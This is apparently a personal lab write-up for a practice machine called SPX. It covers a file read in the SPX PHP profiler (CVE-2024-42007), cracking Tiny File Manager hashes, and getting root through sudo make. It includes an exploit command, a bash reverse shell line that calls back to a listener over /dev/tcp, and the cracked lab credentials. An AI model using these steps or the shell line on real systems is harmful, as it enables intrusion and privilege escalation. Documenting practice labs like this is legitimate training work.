# SPX \[Inter]

## Report

Tiny FIle Manager on port 80 does not follow default creds. Phpinfo is exposed via phpinfo.php and reveals a SPX version that is vulnerable to arbitary file read, reading the index file after checking structure on github, we find hashes for 'user' and 'admin', crack to get creds and upload a reverse shell

User profiler uses the same password as admin from web interface and can run make as sudo, editing the 'Makefile' to add our own shell, we get reverse shell as root.

### Hint

* How tf would you find phpinfo.php if you keep being offside all the time damnit

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption><p>line 150,000 there's levels to this yk</p></figcaption></figure>

* Also, you clocked the hashes would be in the php file itself after seeing the app structure on github but come on man you couldn't figure out 'tinyfilemanager.php' was renamed to index.php?
* Not being able to privesc via sudo is an abomination icl

## Cheatsheet

```
python3 CVE_2024_42007.py -t http://192.168.222.108 -f /etc/passwd
edit key value from phpinfo.php and read index.php
```

## Loot

### Enumeration

22, 80

#### 80

Apache/2.4.52 (Ubuntu)

Tiny file manager

Default username/password: admin/admin@123 and user/12345 - Don't work

Only index.php to work with here find creds somehow

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

FInd Tiny File Manager 2.5.3 after logging in

### Attack Vectors

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Edit spx\_key value from 'dev' (default value) to key mentioned here

{% embed url="https://github.com/BubblyCola/CVE_2024_42007/tree/main" %}

### PrivEsc

`(ALL) /usr/bin/make install -C /home/profiler/php-spx`

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption><p>add pur own binary and embed reverse shell</p></figcaption></figure>

```
profiler@spx:/tmp$ cat sh
#!/bin/bash
/bin/sh -i >& /dev/tcp/192.168.45.188/8001 0>&1
```

### Creds

#### TinyFileManager

```
admin:$2y$10$7LaMUa8an8NrvnQsj5xZ3eDdOejgLyXE8IIvsC.hFy1dg7rPb9cqG
user:$2y$10$x8PS6i0Sji2Pglyz7SLFruYFpAsz9XAYsdiPyfse6QDkB/QsdShxi
user:profiler
admin:lowprofile
```

#### Box

profiler:lowprofile

### Proof

You've worked with the make command before why would you think Configure was where it's at and not Makefile
